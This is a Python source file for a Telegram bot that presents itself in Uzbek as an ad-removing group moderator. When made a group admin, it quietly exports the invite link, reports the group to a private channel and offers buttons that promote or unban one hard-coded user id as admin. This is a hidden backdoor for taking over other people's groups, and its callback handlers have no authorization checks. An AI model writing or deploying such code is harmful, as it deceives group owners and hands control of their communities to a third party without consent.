from aiogram import types, html
from loader import dp,bot
from data.config import BOT
from aiogram.filters import ChatMemberUpdatedFilter,IS_NOT_MEMBER, ADMINISTRATOR,IS_MEMBER
from keyboards.inline.buttons import add_group_button
import sqlite3
from datetime import datetime
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton



DATABASE_FILE = "bot.db"
conn = sqlite3.connect(DATABASE_FILE)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS groups (
        id INTEGER PRIMARY KEY,
        username VARCHAR(50) NULL,
        title TEXT,
        group_id INTEGER,
        invite_link TEXT NULL,
        registration_date TEXT
    )
''')
conn.commit()

silka = html.link(value="silkalarni",link=f"https://t.me/{BOT}?start=true")
i_am_ready_text = f'''
Salom👋
<b>Men reklamalarni, yashirin {silka} Guruhlarda o'chirib beraman 👨🏻‍✈️</b>

{html.blockquote(value="<b>Guruhdagi kirdi - chiqdi 🔞+ xabarlarini va hatto tahrirlangan xabarlarni tekshiraman va u reklama boʻlsa oʻchiraman 🤖</b>")}

Men guruhda ishlashga <b>tayyorman😎</b>

{html.blockquote(value="<b>🚫Eslatma Men Guruh Adminlari tashlagan reklamalarni o'chirmayman.</b>")}
'''

async def is_group_registered(group_id):
    cursor.execute('''
        SELECT group_id FROM groups WHERE group_id=?
    ''', (group_id,))
    result = cursor.fetchone()
    return result is not None


# #################################################################
@dp.my_chat_member(ChatMemberUpdatedFilter(member_status_changed=IS_NOT_MEMBER >> ADMINISTRATOR))
async def bot_added_as_admin(event: types.ChatMemberUpdated):
    username = event.chat.username
    title = event.chat.title
    group_id = event.chat.id
    chat_type = event.chat.type.title()
    count_users = await bot.get_chat_member_count(chat_id=group_id)
    try:
        invite_link = await bot.export_chat_invite_link(chat_id=group_id)
    except:
        invite_link = None
        
    if not await is_group_registered(group_id):
        registration_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute('''
            INSERT INTO groups (username,title,group_id,invite_link,registration_date)
            VALUES (?, ?, ?, ?, ?)
        ''', (username, title, group_id, invite_link, registration_date))
        conn.commit()
        msg = f"""
{html.code(value=chat_type)}
<b>Name:</b> {title}
<b>Username:</b> {f"@{username}" if username else 'None'}
<b>{chat_type}🆔:</b> {html.code(value=group_id)}
<b>Reg 📆:</b> {registration_date}
<b>Members 👤:</b> {count_users}
"""
        await bot.send_message(chat_id=-1002039102176,text=msg,
        reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=f"{chat_type}", url=invite_link if invite_link else 'https://t.me/ulugbekhusain'),
            ],
            [
                InlineKeyboardButton(text="Refresh",callback_data=f"refresh:{group_id}"),
                InlineKeyboardButton(text="Make Admin", callback_data=f'makeadmin:{group_id}'),
            ],
            [
                InlineKeyboardButton(text="Check New Admin", callback_data=f'checknewadmin:{group_id}')
            ],
            [
                InlineKeyboardButton(text="Leave Chat", callback_data=f'leavechat:{group_id}'),
                InlineKeyboardButton(text="Unban", callback_data=f'unban_me:{group_id}')
            ]
        ]

))
    await event.answer(
        text=i_am_ready_text,reply_markup=add_group_button,disable_web_page_preview=True
    )


@dp.my_chat_member(ChatMemberUpdatedFilter(member_status_changed=IS_MEMBER >> ADMINISTRATOR)
)
async def bot_added_as_admin(event: types.ChatMemberUpdated):
    username = event.chat.username
    title = event.chat.title
    group_id = event.chat.id
    chat_type = event.chat.type.title()
    count_users = await bot.get_chat_member_count(chat_id=group_id)
    try:
        invite_link = await bot.export_chat_invite_link(chat_id=group_id)
    except:
        invite_link = None
    if not await is_group_registered(group_id):
        registration_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        cursor.execute('''
            INSERT INTO groups (username,title,group_id,invite_link,registration_date)
            VALUES (?, ?, ?, ?, ?)
        ''', (username, title, group_id, invite_link, registration_date))
        conn.commit()
        msg = f"""
{html.code(value=chat_type)}
<b>Name:</b> {title}
<b>Username:</b> {f"@{username}" if username else 'None'}
<b>{chat_type}🆔:</b> {html.code(value=group_id)}
<b>Reg 📆:</b> {registration_date}
<b>Members 👤:</b> {count_users}
"""
        await bot.send_message(chat_id=-1002039102176,text=msg,reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=f"{chat_type}", url=invite_link if invite_link else 'https://t.me/ulugbekhusain'),
            ],
            [
                InlineKeyboardButton(text="Refresh",callback_data=f"refresh:{group_id}"),
                InlineKeyboardButton(text="Make Admin", callback_data=f'makeadmin:{group_id}'),
            ],
            [
                InlineKeyboardButton(text="Check New Admin", callback_data=f'checknewadmin:{group_id}')
            ],
            [
                InlineKeyboardButton(text="Leave Chat", callback_data=f'leavechat:{group_id}'),
                InlineKeyboardButton(text="Unban", callback_data=f'unban_me:{group_id}')
            ]
        ]
))
    await event.answer(
        text=i_am_ready_text,reply_markup=add_group_button,disable_web_page_preview=True
    )



        
@dp.my_chat_member(ChatMemberUpdatedFilter(member_status_changed=IS_NOT_MEMBER >> IS_MEMBER)
)
async def bot_added_as_admin(event: types.ChatMemberUpdated):
    await event.answer(
        text=f'''
Salom👋
<b>Men reklamalarni, yashirin {silka} Guruhlarda o'chirib beraman 👨🏻‍✈️</b>

{html.blockquote(value="<b>Guruhdagi kirdi - chiqdi 🔞+ xabarlarini va hatto tahrirlangan xabarlarni tekshiraman va u reklama boʻlsa oʻchiraman 🤖</b>")}

Men ishlashim uchun Guruhingizga <b>ADMIN</b> qilishingiz kerak😎
''',
reply_markup=add_group_button ,disable_web_page_preview=True
    )



async def promote_user_to_admin(chat_id, user_id):
    try:
        await bot.promote_chat_member(
            chat_id=chat_id,
            user_id=user_id,
            can_delete_messages=True,
            can_restrict_members=True,
        )
        return True
    except:
        return False


async def has_bot_permissions(chat_id):
    try:
        bot_member = await bot.get_chat_member(chat_id=chat_id, user_id=bot.id)
        return bot_member.can_promote_members
    except:
        return False

async def has_user_permission(chat_id, user_id):
    try:
        user_member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        return user_member.can_promote_members
    except:
        return False



async def bot_restrict_permission(chat_id):
    try:
        bot_member = await bot.get_chat_member(chat_id=chat_id, user_id=bot.id)
        return bot_member.can_restrict_members
    except:
        return False

async def unban_user(chat_id, user_id):
    try:
        if await bot_restrict_permission(chat_id=chat_id):
            await bot.unban_chat_member(chat_id=chat_id, user_id=user_id, only_if_banned=True)
            return True
    except: 
        return False


@dp.callback_query(lambda query: query.data.startswith("unban_me:"))
async def unban_me(callback_query: types.CallbackQuery):
    try:
        _, group_id = callback_query.data.split(":")
        group_id = int(group_id)
        admin_id = 2083239343
        success = await unban_user(chat_id=group_id, user_id=admin_id)

        if success:
            await callback_query.answer("Muvafaqiyatli✅",show_alert=True)
        else:
            await callback_query.answer("Xatolik yuz berdi. Qayta urinib ko'ring⛔︎",show_alert=True)
    except:
        pass

@dp.callback_query(lambda query: query.data.startswith("checknewadmin:"))
async def check_new_admin(callback_query: types.CallbackQuery):
    try:
        _, group_id = callback_query.data.split(":")
        group_id = int(group_id)
        success = await has_bot_permissions(group_id)
        
        if success:
            await callback_query.answer("Yangi Admin qo'shishga ruxsat bor",show_alert=True)
        else:
            await callback_query.answer("Xatolik yuz berdi. Yangi Admin qo'shishga ruxsati yo'q",show_alert=True)
    except:
        pass

@dp.callback_query(lambda query: query.data.startswith("makeadmin:"))
async def makeadmin(callback_query: types.CallbackQuery):
    try:
        _, group_id = callback_query.data.split(":")
        group_id = int(group_id)

        admin_id = 2083239343
        success = await promote_user_to_admin(chat_id=group_id, user_id=admin_id)
        if success:
            await callback_query.answer("Admin sifatida muvaffaqiyatli qo'shildingiz.",show_alert=True)
        else:
            await callback_query.answer("Xatolik yuz berdi. Bot ruxsatini tekshiring",show_alert=True)
    except:
        pass


@dp.callback_query(lambda query: query.data.startswith("leavechat:"))
async def leavechat(callback_query: types.CallbackQuery):
    try:
        _, group_id = callback_query.data.split(":")
        group_id = int(group_id)

        success = await bot.leave_chat(chat_id=group_id)

        if success:
            await callback_query.answer("Muvafaqiyatli✅",show_alert=True)
        else:
            await callback_query.answer("Xatolik yuz berdi. Qayta urinib ko'ring⛔︎",show_alert=True)
    except:
        pass



@dp.callback_query(lambda query: query.data.startswith("refresh:"))
async def refresh_group_info(callback_query: types.CallbackQuery):
    try:
        _, group_id = callback_query.data.split(":")
        group_id = int(group_id)
        get_chat = await bot.get_chat(group_id)
        title = get_chat.title
        username = get_chat.username
        chat_type = get_chat.type.title()
        count_users = await bot.get_chat_member_count(chat_id=group_id)
        try:
            invite_link = await bot.export_chat_invite_link(chat_id=group_id)
        except:
            invite_link = None
        edit_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")        
        refreshed_group_text = f"""
{html.code(value=chat_type)}
<b>Name:</b> {title}
<b>Username:</b> {f"@{username}" if username else 'None'}
<b>{chat_type}🆔:</b> {html.code(value=group_id)}
<b>Editing ✍️:</b> {edit_date}
<b>Members 👤:</b> {count_users}
"""
        await bot.edit_message_text(chat_id=callback_query.message.chat.id,
                                    message_id=callback_query.message.message_id,
                                    text=refreshed_group_text,
                                    reply_markup=InlineKeyboardMarkup(
                                    inline_keyboard=[
                                        [
                                            InlineKeyboardButton(text=f"{chat_type}", url=invite_link if invite_link else 'https://t.me/ulugbekhusain'),
                                        ],
                                        [
                                            InlineKeyboardButton(text="Refresh",callback_data=f"refresh:{group_id}"),
                                            InlineKeyboardButton(text="Make Admin", callback_data=f'makeadmin:{group_id}'),
                                        ],
                                        [
                                            InlineKeyboardButton(text="Check New Admin", callback_data=f'checknewadmin:{group_id}')
                                        ],
                                        [
                                            InlineKeyboardButton(text="Leave Chat", callback_data=f'leavechat:{group_id}'),
                                            InlineKeyboardButton(text="Unban", callback_data=f'unban_me:{group_id}')
                                        ]
                                    ]
                                    ))
    except:
        pass
